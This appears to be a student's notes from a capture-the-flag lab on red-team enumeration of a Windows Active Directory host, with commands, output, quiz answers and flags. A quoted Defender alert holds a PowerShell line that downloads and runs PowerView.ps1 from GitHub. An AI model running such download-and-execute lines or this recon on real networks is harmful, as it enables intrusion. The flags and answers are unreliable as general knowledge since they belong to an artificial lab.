@@ -1,0 +1,546 @@
+[Network Infrastructure]
+
+    [+] Upon arrival on an unknown network, the first goal is to identify the network and determine what can be accessed.
+
+    [+] Enumeration of compromised machines after initial access is crucial to understanding the target system, services provided, and the type of network.
+
+    [+] Network segmentation is an additional layer of security that divides a network into subnets to improve security and management.
+
+    [+] Virtual Local Area Networks (VLANs) are used for network segmentation and control networking issues within the local network while enhancing security.
+
+    [+] Internal networks are segmented subnetworks within an organization that facilitate information sharing, faster communication, collaboration tools, operational systems, and network services.
+
+    [+] Network administrators use network segmentation in corporate networks for traffic control, optimizing performance, and improving security.
+
+    [+] A Demilitarized Zone (DMZ) is an edge network that adds an extra layer of security between the public internet and internal networks, protecting the internal network from untrusted traffic.
+
+    [+] DMZ networks are designed to isolate and control access to public services such as websites, DNS, FTP, Proxy, and VPN.
+
+    [+] Enumerating the system and internal network is the discovery stage for an attacker, allowing them to gather information and potentially perform lateral movement or privilege escalation for gaining more access and control.
+
+    [+] Let's start checking the target machine's TCP and UDP open ports:
+
+        >>> PS C:\Users\thm> netstat -na
+
+        [?] "-n" option is used to display addresses and port numbers in numerical form
+
+        [?] "-a" option is used to display all active connections and listening ports, including both TCP and UDP protocols
+
+        Active Connections
+
+        Proto  Local Address          Foreign Address        State
+        TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+        TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
+        TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+        TCP    0.0.0.0:389            0.0.0.0:0              LISTENING   
+
+        [>>] The output reveals the open ports as well as the established connections
+
+    [+] Let's list the ARP table, which contains the IP address and the physical address of the computers that communicated with the target machines within the network 
+
+        >>> PS C:\Users\thm> arp -a
+
+        [?] "-a" option is used to display the current ARP (Address Resolution Protocol) cache, which contains a mapping of IP addresses to MAC (Media Access Control) addresses
+
+        Interface: 10.10.141.51 --- 0xa
+        Internet Address      Physical Address      Type
+        10.10.0.1             02-c8-85-b5-5a-aa     dynamic
+        10.10.255.255         ff-ff-ff-ff-ff-ff     static
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Active Directory (AD) environment] 
+
+    [+] It is a Windows-based directory service that stores and provides data objects to the internal network environment  
+        Allows for centralized management of authentication and authorization
+
+    [+] The AD contains essential information about the network and the environment, including users, computers, printers, etc. 
+        For example, AD might have users' details such as job title, phone number, address, passwords, groups, permission, etc
+
+        
+    [+] A Domain Controller is a Windows server that provides Active Directory services and controls the entire domain
+        It is a form of centralized user management that provides encryption of user data as well as controlling access to a network, including users, groups, policies, and computers
+        It also enables resource access and sharing. These are all reasons why attackers target a domain controller in a domain because it contains a lot of high-value information.                 
+                               
+                                +---------------------------+
+                                |        Domain             |
+                                |     (example.com)         |                                        => Domain
+                                +---------------------------+
+                                            |
+                +-------------------+-----------------+------------------+
+                |                   |                 |                  |
+          +-----v----+       +------v-------+  +------v-------+   +------v--------+
+          |  OU      |       |    OU        |  |    OU        |   |      OU       |
+          | (Sales)  |       | (Marketing)  |  | (Engineering)|   |(HR Department)|                  => Geographical Layer OU's
+          +----------+       +--------------+  +--------------+   +---------------+
+               |                     |                  |                  |
+          +----v------+      +-------v-------+  +-------v------+   +-------v------+
+          |   Group   |      |    Group      |  |    Group     |   |    Group     |
+          | (Sales A) |      | (Marketing A) |  | (Engineering)|   | (HR Team A)  |                  => Administrative Layer OU's
+          +-----------+      +---------------+  +--------------+   +--------------+
+               |                    |                  |                   |
+          +----v------+      +------v-------+  +-------v------+    +-------v------+
+          |   User    |      |    User      |  |    User      |    |    User      |
+          | (John S.) |      | (Emily J.)   |  | (Mark T.)    |    | (Sarah M.)   |                  => Objects
+          +-----------+      +--------------+  +--------------+    +--------------+
+
+    [+] Organizational Units (OU's) are containers within the AD domain with a hierarchical structure.
+
+    [+] Active Directory Objects can be a single user or a group, or a hardware component, such as a computer or printers
+
+    [+] AD domains are a collection of Microsoft components within an AD network.
+
+    [+] AD Forest is a collection of domains that trust each other.
+
+[Question 1] Before going any further, ensure the attached machine is deployed and try what we discussed. Is the attached machine part of the AD environment? (Y|N) => Y
+
+        Microsoft Windows [Version 10.0.17763.1821]
+        (c) 2018 Microsoft Corporation. All rights reserved.
+
+        C:\Users\kkidd>systeminfo | findstr Domain
+        OS Configuration:          Primary Domain Controller
+        Domain:                    thmredteam.com
+
+[Question 2] If it is part of an AD environment, what is the domain name of the AD? => thmredteam.com
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Users and Groups Management]
+
+
+    [+] Account discovery is the first step in understanding the compromised machine and identifying other accounts in the system.
+
+    [+] An Active Directory environment consists of different types of accounts with varying permissions, access levels, and roles
+
+    [+] Common types of Active Directory service accounts include built-in local user accounts, domain user accounts, managed service accounts, and virtual accounts.
+
+    [+] Built-in local user accounts are used for local system management and are not part of the Active Directory environment.
+
+    [+] Domain user accounts have access to Active Directory services and are managed within the Active Directory environment.
+
+    [+] AD managed service accounts are limited domain user accounts with higher privileges specifically designed to manage AD services.
+
+    [+] Domain Administrators are user accounts that have full control over an Active Directory environment, including configuration, users, groups, permissions, roles, and services.
+
+    [+] The passage lists various Active Directory Administrator accounts, including 
+    
+            [1] BUILTIN\Administrator
+            [2] Domain Admins
+            [3] Enterprise Admins
+            [4] Schema Admins
+            [5] Server Operators
+            [6] Account Operators
+
+    [+] The goal of the red team in engagements is to find information leading to a domain administrator account to gain complete control over the Active Directory environment.
+
+    [+] The following PowerShell command is to get all active directory user accounts:
+
+        >>> PS C:\Users\thm> Get-ADUser  -Filter *
+
+        [?]  "Get-ADUser" command is a PowerShell cmdlet used in Active Directory environments to retrieve information about user accounts
+
+        [?] "-Filter *" parameter is used to retrieve all user accounts without any filtering conditions.
+
+        DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
+        Enabled           : True
+        GivenName         :
+        Name              : Administrator
+        ObjectClass       : user
+        ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
+        SamAccountName    : Administrator
+        SID               : S-1-5-21-1966530601-3185510712-10604624-500
+        Surname           :
+        UserPrincipalName :
+
+    [+] Just a real ouput to make it easier to understand:
+
+        >>> PS C:\Users\kkidd> Get-ADUser
+
+        cmdlet Get-ADUser at command pipeline position 1
+        Supply values for the following parameters:
+        (Type !? for Help.)
+        Filter: *
+
+
+        DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
+        Enabled           : True
+        GivenName         :
+        Name              : Administrator
+        ObjectClass       : user
+        ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
+        SamAccountName    : Administrator
+        SID               : S-1-5-21-1966530601-3185510712-10604624-500
+        Surname           :
+        UserPrincipalName :
+
+        DistinguishedName : CN=Guest,CN=Users,DC=thmredteam,DC=com
+        GivenName         :
+        Name              : Guest
+        ObjectClass       : user
+        ObjectGUID        : e2c30114-37c2-4ab2-abd6-0e6c84753518
+        SamAccountName    : Guest
+        SID               : S-1-5-21-1966530601-3185510712-10604624-501
+        Surname           :
+        UserPrincipalName :
+        ...
+
+    [Note] The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN), and other
+
+[Question 1] Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available? 6
+
+    >>> PS C:\Users\kkidd> (Get-ADUser -Filter * -SearchBase "OU=THM,DC=thmredteam,DC=com").Count
+        >> 6
+
+[Question 2] Once you run the previous command, what is the UserPrincipalName (email) of the admin account? => thmadmin@thmredteam.com
+
+    # Get-ADUser -Filter * -SearchBase "OU=THM,DC=thmredteam,DC=com" | Select-Object UserPrincipalName
+
+    UserPrincipalName
+    -----------------
+    ppittman@thmredteam.com
+    dphilips@thmredteam.com
+    wburgess@thmredteam.com
+    csolomon@thmredteam.com
+    kkidd@thmredteam.com
+    thmadmin@thmredteam.com
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Host Security Solution #1]
+
+    [+] It is a set of software applications used to monitor and detect abnormal and malicious activities within the host, including:
+
+        [1] Antivirus software
+        [2] Microsoft Windows Defender
+        [3] Host-based Firewall
+        [4] Security Event Logging and Monitoring 
+        [5] Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS)
+        [6] Endpoint Detection and Response (EDR)
+
+    [!] Antivirus Software (AV)
+
+        [+] Antivirus software, also known as anti-malware, is used to monitor, detect, and prevent malicious software from being executed on a host system.
+        
+        [+] Common features of antivirus software include background scanning, full system scans, and virus definitions.
+
+        [+] Full system scans are essential during the initial installation of antivirus software to ensure comprehensive scanning of the entire system.
+
+        [+] Virus definitions are pre-defined signatures of known viruses that the antivirus software uses to identify and detect threats.
+
+            [>>] Antivirus software needs regular updates to keep up with new virus definitions and emerging threats 
+
+        [+] Detection techniques used by antivirus software include signature-based detection, heuristic-based detection, and behavior-based detection.
+
+            [1] Signature-based detection compares scanned files with a database of known virus signatures to identify threats.
+
+            [2] Heuristic-based detection uses machine learning and real-time static analysis to identify suspicious properties in application code and behavior.
+
+            [3] Behavior-based detection monitors the execution of applications to detect abnormal behaviors and uncommon activities that may indicate a threat. 
+
+    [+] As a red teamer, it is essential to be aware of whether antivirus exists or not.
+
+            >>> PS C:\Users\thm> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+            [?] Get-CimInstance: This is a PowerShell cmdlet used to retrieve instances of CIM (Common Information Model) classes.
+
+            [?] -Namespace root/SecurityCenter2: This parameter specifies the namespace where the CIM class resides
+                                                 In this case, we are targeting the "SecurityCenter2" namespace, which contains information related to security products.
+
+            [?] -ClassName AntivirusProduct: This parameter specifies the name of the CIM class we want to query
+
+            displayName              : Bitdefender Antivirus
+            instanceGuid             : {BAF124F4-FA00-8560-3FDE-6C380446AEFB}
+            pathToSignedProductExe   : C:\Program Files\Bitdefender\Bitdefender Security\wscfix.exe
+            pathToSignedReportingExe : C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe
+            productState             : 266240
+            timestamp                : Wed, 15 Dec 2021 12:40:10 GMT
+            PSComputerName           :
+
+            displayName              : Windows Defender
+            instanceGuid             : {D58FFC3A-813B-4fae-9E44-DA132C9FAA36}
+            pathToSignedProductExe   : windowsdefender://
+            pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
+            productState             : 393472
+            timestamp                : Fri, 15 Oct 2021 22:32:01 GMT
+            PSComputerName           :
+
+    [!] Microsoft Windows Defender
+
+        [+] Microsoft Windows Defender is a pre-installed antivirus security tool that is built into the Windows operating system.
+
+        [+] Windows Defender utilizes various algorithms for detection, including machine learning, big data analysis, in-depth threat resistance research, and Microsoft cloud infrastructure.
+
+        [+] Windows Defender operates in three protection modes: Active, Passive, and Disable modes.
+
+            [1] In Active mode, Windows Defender functions as the primary antivirus software on the machine, providing real-time protection and remediation against threats.
+
+            [2] In Passive mode, when a third-party antivirus software is installed, Windows Defender operates as a secondary antivirus software
+
+            [3] Disable mode refers to when Windows Defender is intentionally disabled or uninstalled from the system, and it does not actively provide any antivirus protection.
+
+                >>> PS C:\Users\thm> Get-Service WinDefend
+
+                Status   Name               DisplayName
+                ------   ----               -----------
+                Running  WinDefend          Windows Defender Antivirus Service
+
+                >>> PS C:\Users\thinh> Get-MpComputerStatus
+
+                [?] "Get-MpComputerStatus" command is a PowerShell cmdlet used to retrieve the status of Microsoft Defender Antivirus on a computer
+
+                AMEngineVersion                  : 1.1.23050.3
+                AMProductVersion                 : 4.18.23050.5
+                AMRunningMode                    : Normal
+                AMServiceEnabled                 : True
+                AMServiceVersion                 : 4.18.23050.5
+                AntispywareEnabled               : True
+                AntispywareSignatureAge          : 3
+                AntispywareSignatureLastUpdated  : 6/30/2023 4:57:44 AM
+                AntispywareSignatureVersion      : 1.391.3067.0
+                AntivirusEnabled                 : True
+                AntivirusSignatureAge            : 3
+                AntivirusSignatureLastUpdated    : 6/30/2023 4:57:43 AM
+                AntivirusSignatureVersion        : 1.391.
+
+    [!] Host-based Firewall 
+        
+        [+] It is a security tool installed and run on a host machine that can prevent and block attacker or red teamers' attack attempts
+
+        [+] The main purpose of the host-based firewall is to control the inbound and outbound traffic that goes through the device's interface
+
+        [+] It protects the host from untrusted devices that are on the same network
+
+        [+] For example, a firewall can be configured to block ICMP packets sent through the ping command from other machines in the same network
+
+            >>> PS C:\Users\thinh\Desktop> Get-NetFirewallProfile
+
+            Name                            : Domain
+            Enabled                         : True
+            DefaultInboundAction            : NotConfigured
+            DefaultOutboundAction           : NotConfigured
+            ...
+            AllowInboundRules               : NotConfigured
+            AllowLocalFirewallRules         : NotConfigured
+            AllowLocalIPsecRules            : NotConfigured
+            AllowUserApps                   : NotConfigured
+            AllowUserPorts                  : NotConfigured
+            AllowUnicastResponseToMulticast : NotConfigured
+            NotifyOnListen                  : True
+            EnableStealthModeForIPsec       : NotConfigured
+            LogFileName                     : %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+            LogMaxSizeKilobytes             : 4096
+            LogAllowed                      : False
+            LogBlocked                      : False
+            LogIgnored                      : NotConfigured
+            ...
+        
+            >>> PS C:\Users\thinh\Desktop> Test-NetConnection
+
+            ComputerName           : internetbeacon.msedge.net
+            RemoteAddress          : 127.0.0.1
+            InterfaceAlias         : Loopback Pseudo-Interface 1
+            SourceAddress          : 127.0.0.1
+            PingSucceeded          : True
+            PingReplyDetails (RTT) : 0 ms
+
+[Question 1] Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N) => N
+
+    >>> PS C:\Users\kkidd> Get-NetFirewallProfile
+
+    Name                            : Domain
+    Enabled                         : False
+    ...
+    Name                            : Private
+    Enabled                         : False
+    ...
+    Name                            : Public
+    Enabled                         : False
+
+[Question 2] What is the file name that causes this alert to record? => PowerView.ps1
+
+    >>> PS C:\Users\kkidd> Get-MpThreat
+
+    CategoryID       : 8
+    DidThreatExecute : False
+    IsActive         : False
+    Resources        :  {CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).D
+                        ownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1');
+                        Get-NetGroupMember 'Domain Admins', internalCmdLine:_i AQAAAA2wA4AAAAAAAAAAAF8Q02fXQQEAbRa5PR40vlvAd
+                        Uq6bbN3ro51dwpUcm9qYW46UG93ZXJTaGVsbC9Qb3dlcnNwbG9pdC5HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                        AAAAA== 57 10 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell IEX (New-Object N
+                        et.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Power
+                        View.ps1'); Get-NetGroupMember 'Domain Admins'}      
+
+    => DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
+
+[Question 3] Enumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the THM-Connection rule? => 17337
+
+    PS C:\Users\kkidd> Get-NetFirewallRule | findstr THM-Connection
+    DisplayName           : THM-Connection
+    Description           : THM-Connection inbound to 17337 Port!
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Host Security Solution #2]
+
+    [!] Security Event Logging and Monitoring 
+
+        [+] We can get a list of available event logs on the local machine using the Get-EventLog cmdlet
+
+            >>> PS C:\Users\thinh\Desktop> Get-EventLog -List
+
+            Max(K) Retain OverflowAction        Entries Log
+            ------ ------ --------------        ------- ---
+            20,480      0 OverwriteAsNeeded      35,468 Application
+            20,480      0 OverwriteAsNeeded           0 HardwareEvents
+            512      7 OverwriteOlder              0 IntelAudioServiceLog
+            512      7 OverwriteOlder              0 Internet Explorer
+            20,480      0 OverwriteAsNeeded           0 Key Management Service
+            128      0 OverwriteAsNeeded       3,402 OAlerts
+            512      7 OverwriteOlder          2,593 OneApp_IGCC
+                                                        Security
+            20,480      0 OverwriteAsNeeded      40,594 System
+            15,360      0 OverwriteAsNeeded      14,969 Windows PowerShell
+
+            [?] Executing this command in PowerShell will display a list of event logs available on the Windows machine
+
+
+    [!] System Monitor (Sysmon)
+
+        [+] One of the great features of the sysmon  tool is that it can log many important events, and you can also create your own rule(s) and configuration to monitor:
+
+            [1] Process creation and termination
+            [2] Network connections
+            [3] Modification on file
+            [4] Remote threats
+            [5] Process and memory access
+            [6] and many others
+
+    [+] HIDS (Host-based Intrusion Detection System) is software that monitors and detects abnormal and malicious activities in a host.
+
+    [+] HIDS primarily focuses on detecting suspicious activities rather than preventing them.
+
+    [+] HIPS (Host-based Intrusion Prevention System) secures the activities of the operating system where it is installed.
+
+    [+] HIPS is a combination of different security features such as antivirus, behavior analysis, network, and application firewall, can audit log files, monitor processes, and protect system resources.
+
+    [+] EDR (Endpoint Detection and Response) is a cybersecurity solution that defends against malware and other threats.
+
+    [+] EDR can detect malicious files, monitor endpoint, system, and network events, and record them for further analysis and investigation.
+
+    [+] Even if an attacker successfully bypasses EDR and gains a reverse shell, EDR continues to monitor the system and may block further malicious actions.
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Network Security Solutions]
+
+[+] Network security solutions are used to monitor, detect, and prevent malicious activities within a network, focusing on protecting clients and devices connected to the network.
+
+[+] Network security solutions include various components such as network firewalls, SIEM, and IDS/IPS.
+
+    [1] Network firewalls act as the first line of defense by filtering untrusted traffic based on rules and policies, and they can separate networks from external or internal source
+
+    [2] SIEM combines security information management and security event management to monitor and analyze events in real-time, helping system administrators track potential security threats and vulnerabilities.
+
+    [3] IDS/IPS are network-based cybersecurity solutions that detect and monitor network packets for abnormal behaviors and known threats
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Applications and Services]
+
+[Question 1] Find the port number for THM Service. What is the port number? => 13337
+
+    >>> PS C:\Users\kkidd> wmic service | findstr "thm"
+
+        [?] The "wmic service" command in Windows Management Instrumentation Command-line (WMIC) allows you to manage and query information about services on a Windows system
+
+        =>  c:\Windows\thm-service.exe
+
+    >>> PS C:\Users\kkidd> Get-Process | findstr "thm"
+        
+        78       9    12660       5684              2480   0 thm-service
+    
+    >>> PS C:\Users\kkidd> netstat -noa |  findstr "2480"
+
+        [?] "-n": Displays the addresses and port numbers in numerical format, instead of resolving them to host and service names.
+        
+        [?] "-o": Displays the owning process ID (PID) associated with each connection or listening port.
+        
+        [?] "-a": Displays all active connections and listening ports, including those that are not established
+
+        TCP    0.0.0.0:13337          0.0.0.0:0              LISTENING       2480
+        TCP    [::]:13337             [::]:0                 LISTENING       2480
+        UDP    0.0.0.0:62480          *:*                                    2456
+
+[Question 2] Visit the localhost on the port you found in Question #1. What is the flag? => THM{S3rv1cs_1s_3numerat37ed}
+
+        >>> PS C:\Users\kkidd> curl 127.0.0.1:13337
+
+            StatusCode        : 200
+            StatusDescription : OK
+            Content           : Hi the flag is: THM{S3rv1cs_1s_3numerat37ed}
+            RawContent        : HTTP/1.1 200 OK
+                                Content-Length: 44
+                                Content-Type: text/plain; charset=utf-8
+                                Date: Tue, 04 Jul 2023 05:44:07 GMT
+
+                                Hi the flag is: THM{S3rv1cs_1s_3numerat37ed}
+            Forms             : {}
+            Headers           : {[Content-Length, 44], [Content-Type, text/plain; charset=utf-8], [Date, Tue, 04 Jul 2023 05:44:07 GMT]}
+            Images            : {}
+            InputFields       : {}
+            Links             : {}
+            ParsedHtml        : System.__ComObject
+            RawContentLength  : 44
+
+[Question 3] Enumerate the domain name of the domain controller, thmredteam.com, using the nslookup.exe, and perform a DNS zone transfer. What is the flag for one of the records? => THM{DNS-15-Enumerated!}
+
+    >>> PS C:\Users\kkidd> nslookup.exe
+
+        [?] "nslookup.exe" command in Windows is a command-line tool used to query the Domain Name System (DNS) and retrieve information about domain names, IP addresses, and other DNS-related information
+
+        > server 10.10.21.179 
+
+        [?] Just think about dig example.com @10.10.21.179
+
+        Default Server:  ip-10-10-21-179.eu-west-1.compute.internal
+        Address:  10.10.21.179
+
+        > ls -d thmredteam.com
+        [ip-10-10-21-179.eu-west-1.compute.internal]
+        thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
+        thmredteam.com.                A      10.10.129.59
+        thmredteam.com.                NS     ad.thmredteam.com
+        _msdcs                         NS     ad.thmredteam.com
+        _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
+        _kerberos._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=88, ad.thmredteam.com
+        _ldap._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+        _gc._tcp                       SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
+        _kerberos._tcp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
+        _kpasswd._tcp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
+        _ldap._tcp                     SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+        _kerberos._udp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
+        _kpasswd._udp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
+        ad                             A      10.10.21.179
+        DomainDnsZones                 A      10.10.129.59
+        _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+        _ldap._tcp.DomainDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+        flag                           TXT             "THM{DNS-15-Enumerated!}"
+
+        ForestDnsZones                 A      10.10.129.59
+        _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+        _ldap._tcp.ForestDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+        www                            A      10.10.141.51
+        thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
